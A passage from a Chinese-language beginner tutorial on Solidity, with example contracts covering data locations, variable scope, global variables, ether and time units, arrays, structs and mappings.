100;</span><br><span class="line">        xMemory[1] = 200;</span><br><span class="line">        uint[] memory xMemory2 = x;</span><br><span class="line">        xMemory2[0] = 300;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123;</span><br><span class="line">        //参数为calldata数组，不能被修改</span><br><span class="line">        // _x[0] = 0 //这样修改会报错</span><br><span class="line">        return(_x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码<code>Variables.sol</code>，如下图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Variables &#123;</span><br><span class="line">    uint public x = 1;</span><br><span class="line">    uint public y;</span><br><span class="line">    string public z;</span><br><span class="line"></span><br><span class="line">    function foo() external&#123;</span><br><span class="line">        // 可以在函数里更改状态变量的值</span><br><span class="line">        x = 5;</span><br><span class="line">        y = 2;</span><br><span class="line">        z = &quot;0xAA&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() external pure returns(uint)&#123;</span><br><span class="line">        uint xx = 1;</span><br><span class="line">        uint yy = 3;</span><br><span class="line">        uint zz = xx + yy;</span><br><span class="line">        return(zz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function global() external view returns(address, uint, bytes memory)&#123;</span><br><span class="line">        address sender = msg.sender;</span><br><span class="line">        uint blockNum = block.number;</span><br><span class="line">        bytes memory data = msg.data;</span><br><span class="line">        return(sender, blockNum, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function weiUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 wei == 1e0);</span><br><span class="line">        assert(1 wei == 1);</span><br><span class="line">        return 1 wei;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function gweiUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 gwei == 1e9);</span><br><span class="line">        assert(1 gwei == 1000000000);</span><br><span class="line">        return 1 gwei;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function etherUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 ether == 1e18);</span><br><span class="line">        assert(1 ether == 1000000000000000000);</span><br><span class="line">        return 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function secondsUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 seconds == 1);</span><br><span class="line">        return 1 seconds;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function minutesUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 minutes == 60);</span><br><span class="line">        assert(1 minutes == 60 seconds);</span><br><span class="line">        return 1 minutes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hoursUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 hours == 3600);</span><br><span class="line">        assert(1 hours == 60 minutes);</span><br><span class="line">        return 1 hours;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function daysUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 days == 86400);</span><br><span class="line">        assert(1 days == 24 hours);</span><br><span class="line">        return 1 days;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function weeksUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 weeks == 604800);</span><br><span class="line">        assert(1 weeks == 7 days);</span><br><span class="line">        return 1 weeks;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Solidity中的引用类型">Solidity中的引用类型</h3><p><strong>引用类型(Reference Type)</strong>：包括数组（<code>array</code>）和结构体（<code>struct</code>），由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。</p><h3 id="数据位置">数据位置</h3><p>Solidity数据存储位置有三类：<code>storage</code>，<code>memory</code>和<code>calldata</code>。不同存储位置的<code>gas</code>成本不同。</p><ul><li><p><code>storage</code>类型的数据存在链上，类似计算机的硬盘，消耗<code>gas</code>多；</p></li><li><p><code>memory</code>和<code>calldata</code>类型的临时存在内存里，消耗<code>gas</code>少。</p></li></ul><p>大致用法：</p><ol><li><code>storage</code>：合约里的状态变量默认都是<code>storage</code>，存储在链上。</li><li><code>memory</code>：函数里的参数和临时变量一般用<code>memory</code>，存储在内存中，不上链。尤其是如果返回数据类型是变长的情况下，必须加memory修饰，例如：string, bytes, array和自定义结构。</li><li><code>calldata</code>：和<code>memory</code>类似，存储在内存中，不上链。与<code>memory</code>的不同点在于<code>calldata</code>变量不能修改（<code>immutable</code>），一般用于函数的参数。</li></ol><p><code>calldata</code>修饰的变量不能被修改，例子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123;</span><br><span class="line">    //参数为calldata数组，不能被修改</span><br><span class="line">    _x[0] = 0; //这样修改会报错</span><br><span class="line">    return(_x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124163637660.png" alt="image-20250124163637660"></p><h4 id="数据位置和赋值规则">数据位置和赋值规则</h4><p>在不同存储类型相互赋值时候，<strong>有时会产生独立的副本（修改新变量不会影响原变量），有时会产生引用（修改新变量会影响原变量）</strong>。规则如下：</p><ol><li>赋值本质上是创建<strong>引用</strong>指向本体，因此修改本体或者是引用，变化可以被同步。</li></ol><ul><li><code>storage</code>（合约的状态变量）赋值给本地<code>storage</code>（函数里的）时候，会创建引用，改变新变量会影响原变量。样例如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uint[] x = [1,2,3]; // 状态变量：数组 x</span><br><span class="line"></span><br><span class="line">function fStorage() public&#123;</span><br><span class="line">    //声明一个storage的变量 xStorage，指向x。修改xStorage也会影响x</span><br><span class="line">    uint[] storage xStorage = x;</span><br><span class="line">    xStorage[0] = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署调用一下<code>fStorage</code>函数，然后利用交易的<code>hash</code>对代码进行调试，发现数值被更改。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124165024783.png" alt="image-20250124165024783"></p><ul><li><code>memory</code>赋值给<code>memory</code>，会创建引用，改变新变量会影响原变量。</li></ul><ol start="2"><li>其他情况下，赋值创建的是本体的副本，即对二者之一的修改，并不会同步到另一方。</li></ol><h3 id="变量的作用域">变量的作用域</h3><p><code>Solidity</code>中变量按作用域划分有三种，分别是<strong>状态变量（state variable）</strong>，<strong>局部变量（local variable）<strong>和</strong>全局变量(global variable)</strong></p><h4 id="状态变量（state-variable）">状态变量（state variable）</h4><p>状态变量是数据存储在链上的变量，所有合约内函数都可以访问，<code>gas</code>消耗高。状态变量在合约内、函数外声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Variables &#123;</span><br><span class="line">    uint public x = 1;</span><br><span class="line">    uint public y;</span><br><span class="line">    string public z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在函数里更改状态变量的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function foo() external&#123;</span><br><span class="line">    // 可以在函数里更改状态变量的值</span><br><span class="line">    x = 5;</span><br><span class="line">    y = 2;</span><br><span class="line">    z = &quot;0xAA&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="局部变量（local-variable）">局部变量（local variable）</h4><p>局部变量是仅在函数执行过程中有效的变量，<strong>函数退出后，变量无效</strong>。局部变量的<strong>数据存储在内存里，不上链，<code>gas</code>低。</strong></p><p>局部变量在函数内声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function bar() external pure returns(uint)&#123;</span><br><span class="line">    uint xx = 1;</span><br><span class="line">    uint yy = 3;</span><br><span class="line">    uint zz = xx + yy;</span><br><span class="line">    return(zz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="全局变量（global-variable）">全局变量（global variable）</h4><p>全局变量是全局范围工作的变量，都是<code>solidity</code>预留关键字。他们可以在函数内不声明直接使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function global() external view returns(address, uint, bytes memory)&#123;</span><br><span class="line">    address sender = msg.sender;</span><br><span class="line">    uint blockNum = block.number;</span><br><span class="line">    bytes memory data = msg.data;</span><br><span class="line">    return(sender, blockNum, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面例子里，我们使用了3个常用的全局变量：<code>msg.sender</code>，<code>block.number</code>和<code>msg.data</code>，他们分别代表请求发起地址，当前区块高度，和请求数据。下面是一些常用的全局变量，更完整的列表请看这个<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">链接</a>：</p><ul><li><code>blockhash(uint blockNumber)</code>: (<code>bytes32</code>) 给定区块的哈希值 – 只适用于256最近区块, 不包含当前区块。</li><li><code>block.coinbase</code>: (<code>address payable</code>) 当前区块矿工的地址</li><li><code>block.gaslimit</code>: (<code>uint</code>) 当前区块的gaslimit</li><li><code>block.number</code>: (<code>uint</code>) 当前区块的number</li><li><code>block.timestamp</code>: (<code>uint</code>) 当前区块的时间戳，为unix纪元以来的秒</li><li><code>gasleft()</code>: (<code>uint256</code>) 剩余 gas</li><li><code>msg.data</code>: (<code>bytes calldata</code>) 完整call data</li><li><code>msg.sender</code>: (<code>address payable</code>) 消息发送者 (当前 caller)</li><li><code>msg.sig</code>: (<code>bytes4</code>) calldata的前四个字节 (function identifier)</li><li><code>msg.value</code>: (<code>uint</code>) 当前交易发送的 <code>wei</code> 值</li><li><code>block.blobbasefee</code>: (<code>uint</code>) 当前区块的blob基础费用。这是Cancun升级新增的全局变量。</li><li><code>blobhash(uint index)</code>: (<code>bytes32</code>) 返回跟当前交易关联的第 <code>index</code> 个blob的版本化哈希（第一个字节为版本号，当前为<code>0x01</code>，后面接KZG承诺的SHA256哈希的最后31个字节）。若当前交易不包含blob，则返回空字节。这是Cancun升级新增的全局变量。</li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124230136670.png" alt="image-20250124230136670"></p><h4 id="全局变量-以太单位与时间单位">全局变量-以太单位与时间单位</h4><p><strong>以太单位</strong></p><p><code>Solidity</code>中不存在小数点，以<code>0</code>代替为小数点，来确保交易的精确度，并且防止精度的损失，利用以太单位可以避免误算的问题，方便程序员在合约中处理货币交易。</p><ul><li><code>wei</code>: 1</li><li><code>gwei</code>: 1e9 = 1000000000</li><li><code>ether</code>: 1e18 = 1000000000000000000</li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124232933314.png" alt="image-20250124232933314"></p><p><strong>时间单位</strong></p><p>可以在合约中规定一个操作必须在一周内完成，或者某个事件在一个月后发生。这样就能让合约的执行可以更加精确，不会因为技术上的误差而影响合约的结果。因此，时间单位在<code>Solidity</code>中是一个重要的概念，有助于提高合约的可读性和可维护性。</p><ul><li><code>seconds</code>: 1</li><li><code>minutes</code>: 60 seconds = 60</li><li><code>hours</code>: 60 minutes = 3600</li><li><code>days</code>: 24 hours = 86400</li><li><code>weeks</code>: 7 days = 604800</li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124233108775.png" alt="image-20250124233108775"></p><h2 id="引用类型和映射类型">引用类型和映射类型</h2><h3 id="引用类型">引用类型</h3><p>这一讲，我们将介绍<code>Solidity</code>中的两个重要变量类型：数组（<code>array</code>）和结构体（<code>struct</code>）。</p><h4 id="数组array">数组array</h4><p>数组（<code>Array</code>）是<code>Solidity</code>常用的一种变量类型，用来存储一组数据（整数，字节，地址等等）。数组分为固定长度数组和可变长度数组两种：</p><ul><li>固定长度数组：在声明时指定数组的长度。用<code>T[k]</code>的格式声明，其中<code>T</code>是元素的类型，<code>k</code>是长度，例如：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 固定长度 Array</span><br><span class="line">uint[8] array1;</span><br><span class="line">bytes1[5] array2;</span><br><span class="line">address[100] array3;</span><br></pre></td></tr></table></figure><ul><li>可变长度数组（动态数组）：在声明时不指定数组的长度。用<code>T[]</code>的格式声明，其中<code>T</code>是元素的类型，例如：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 可变长度 Array</span><br><span class="line">uint[] array4;</span><br><span class="line">bytes1[] array5;</span><br><span class="line">address[] array6;</span><br><span class="line">bytes array7;</span><br></pre></td></tr></table></figure><p><strong>注意⚠️</strong>：<code>bytes</code>比较特殊，是数组，但是不用加<code>[]</code>。另外，不能用<code>byte[]</code>声明单字节数组，可以使用<code>bytes</code>或<code>bytes1[]</code>。<code>bytes</code> 比 <code>bytes1[]</code> 省gas。</p><h5 id="创建数组的规则">创建数组的规则</h5><p>在Solidity里，创建数组有一些规则：</p><ul><li>对于<code>memory</code>修饰的<code>动态数组</code>，可以用<code>new</code>操作符来创建，但是必须声明长度，并且声明后长度不能改变。例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// memory动态数组</span><br><span class="line">uint[] memory array8 = new uint[](5);</span><br><span class="line">bytes memory array9 = new bytes(9);</span><br></pre></td></tr></table></figure><ul><li><p>数组字面常数(Array Literals)是写作表达式形式的数组，用方括号包着来初始化array的一种方式，并且里面每一个元素的type是以第一个元素为准的，例如<code>[1,2,3]</code>里面所有的元素都是<code>uint8</code>类型，因为在Solidity中，如果一个值没有指定type的话，会根据上下文推断出元素的类型，默认就是最小单位的type，这里默认最小单位类型是<code>uint8</code>。而<code>[uint(1),2,3]</code>里面的元素都是<code>uint</code>类型，因为第一个元素指定了是<code>uint</code>类型了，里面每一个元素的type都以第一个元素为准。</p><p>下面的例子中，<strong>如果没有对传入 <code>g()</code> 函数的数组进行 <code>uint</code> 转换，是会报错的。</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    function f() public pure &#123;</span><br><span class="line">        g([uint(1), 2, 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    function g(uint[3] memory _data) public pure &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果创建的是动态数组，你需要一个一个元素的赋值。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint[] memory x = new uint[](3);</span><br><span class="line">x[0] = 1;</span><br><span class="line">x[1] = 3;</span><br><span class="line">x[2] = 4;</span><br></pre></td></tr></table></figure><h5 id="数组成员">数组成员</h5><ul><li><code>length</code>: 数组有一个包含元素数量的<code>length</code>成员，<code>memory</code>数组的长度在创建后是固定的。</li><li><code>push()</code>: <code>动态数组</code>拥有<code>push()</code>成员，可以<strong>在数组最后添加一个<code>0</code>元素，并返回该元素的引用</strong>。</li><li><code>push(x)</code>: <code>动态数组</code>拥有<code>push(x)</code>成员，<strong>可以在数组最后添加一个<code>x</code>元素</strong>。</li><li><code>pop()</code>: <code>动态数组</code>拥有<code>pop()</code>成员，<strong>可以移除数组最后一个元素。</strong></li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124234418473.png" alt="image-20250124234418473"></p><h4 id="结构体struct">结构体struct</h4><p>此时代码<code>StructTypes.sol</code>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract StructTypes &#123;</span><br><span class="line">    // 结构体 Struct</span><br><span class="line">    struct Student&#123;</span><br><span class="line">        uint256 id;</span><br><span class="line">        uint256 score; </span><br><span class="line">    &#125;</span><br><span class="line">    Student student; // 初始一个student结构体</span><br><span class="line">    //  给结构体赋值</span><br><span class="line">    // 方法1:在函数中创建一个storage的struct引用</span><br><span class="line">    function initStudent1() external&#123;</span><br><span class="line">        Student storage _student = student; // assign a copy of student</span><br><span class="line">        _student.id = 11;</span><br><span class="line">        _student.score = 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 方法2:直接引用状态变量的struct</span><br><span class="line">    function initStudent2() external&#123;</span><br><span class="line">        student.id = 1;</span><br><span class="line">        student.score = 80;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 方法3:构造函数式</span><br><span class="line">    function initStudent3() external &#123;</span><br><span class="line">        student = Student(3, 90);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 方法4:key value</span><br><span class="line">    function initStudent4() external &#123;</span><br><span class="line">        student = Student(&#123;id: 4, score: 60&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Solidity</code>支持通过构造结构体的形式定义新的类型。结构体中的元素可以是原始类型，也可以是引用类型；结构体可以作为数组或映射的元素。创建结构体的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 结构体</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student student; // 初始一个student结构体</span><br></pre></td></tr></table></figure><p>给结构体赋值的四种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//  给结构体赋值</span><br><span class="line">// 方法1:在函数中创建一个storage的struct引用</span><br><span class="line">function initStudent1() external&#123;</span><br><span class="line">    Student storage _student = student; // assign a copy of student</span><br><span class="line">    _student.id = 11;</span><br><span class="line">    _student.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 方法2:直接引用状态变量的struct</span><br><span class="line">function initStudent2() external&#123;</span><br><span class="line">    student.id = 1;</span><br><span class="line">    student.score = 80;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 方法3:构造函数式</span><br><span class="line">function initStudent3() external &#123;</span><br><span class="line">    student = Student(3, 90);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 方法4:key value</span><br><span class="line">function initStudent4() external &#123;</span><br><span class="line">    student = Student(&#123;id: 4, score: 60&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="映射类型">映射类型</h3><p>这一讲，我们将介绍映射（<code>Mapping</code>）类型，Solidity中存储键值对的数据结构，可以理解为哈希表。</p><p>测试代码<code>Mapping.sol</code>，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Mapping &#123;</span><br><span class="line">    mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">    mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br><span class="line">    </span><br><span class="line">    // 规则1. _KeyType不能是自定义的 下面这个例子会报错</span><br><span class="line">    // 我们定义一个结构体 Struct</span><br><span class="line">    // struct Student&#123;</span><br><span class="line">    //    uint256 id;</span><br><span class="line">    //    uint256 score; </span><br><span class="line">    //&#125;</span><br><span class="line">    // mapping(Struct =&gt; uint) public testVar;</span><br><span class="line"></span><br><span class="line">    function writeMap (uint _Key, address _Value) public&#123;</span><br><span class="line">        idToAddress[_Key] = _Value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="映射Mapping">映射Mapping</h4><p>在映射中，人们可以通过键（<code>Key</code>）来查询对应的值（<code>Value</code>），比如：通过一个人的<code>id</code>来查询他的钱包地址。</p><p>声明映射的格式为<code>mapping(_KeyType =&gt; _ValueType)</code>，其中<code>_KeyType</code>和<code>_ValueType</code>分别是<code>Key</code>和<code>Value</code>的变量类型。例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br></pre></td></tr></table></figure><h4 id="映射的规则">映射的规则</h4><ul><li><strong>规则1</strong>：**映射的<code>_KeyType</code>只能选择Solidity内置的值类型，比如<code>uint</code>，<code>address</code>等，不能用自定义的结构体。而<code>_ValueType</code>可以使用自定义的类型。**下面这个例子会报错，因为<code>_KeyType</code>使用了我们自定义的结构体：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 我们定义一个结构体 Struct</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line">mapping(Student =&gt; uint) public testVar;</span><br></pre></td></tr></table></figure><ul><li><p><strong>规则2</strong>：映射的存储位置必须是<code>storage</code>，因此可以用于合约的状态变量，函数中的<code>storage</code>变量和library函数的参数（见<a href="https://github.com/ethereum/solidity/issues/4635">例子</a>）。不能用于<code>public</code>函数的参数或返回结果中，因为<code>mapping</code>记录的是一种关系 (key - value pair)。</p></li><li><p><strong>规则3</strong>：如果映射声明为<code>public</code>，那么Solidity会自动给你创建一个<code>getter</code>函数，可以通过<code>Key</code>来查询对应的<code>Value</code>。</p></li><li><p><strong>规则4</strong>：给映射新增的键值对的语法为<code>_Var[_Key] = _Value</code>，其中<code>_Var</code>是映射变量名，<code>_Key</code>和<code>_Value</code>对应新增的键值对。例子：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function writeMap (uint _Key, address _Value) public&#123;</span><br><span class="line">    idToAddress[_Key] = _Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入<code>mapping</code>，并读取。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250125004147867.png" alt="image-20250125004147867"></p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250125004238778.png" alt="image-20250125004238778"></p><h4 id="映射的原理">映射的原理</h4><ul><li><strong>原理1</strong>: <strong>映射不储存任何键（<code>Key</code>）的资讯，也没有length的资讯。</strong></li><li><strong>原理2</strong>: 映射使用<code>keccak256(abi.encodePacked(key, slot))</code>当成offset存取value，其中<code>slot</code>是映射变量定义所在的插槽位置。</li><li><strong>原理3</strong>: 因为Ethereum会定义所有未使用的空间为0，所以<strong>未赋值（<code>Value</code>）的键（<code>Key</code>）初始值都是各个type的默认值</strong>，如uint的默认值是0。</li></ul><h2 id="变量初始化">变量初始化</h2><p>在<code>Solidity</code>中，声明但没赋值的变量都有它的初始值或默认值。这一讲，我们将介绍常用变量的初始值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 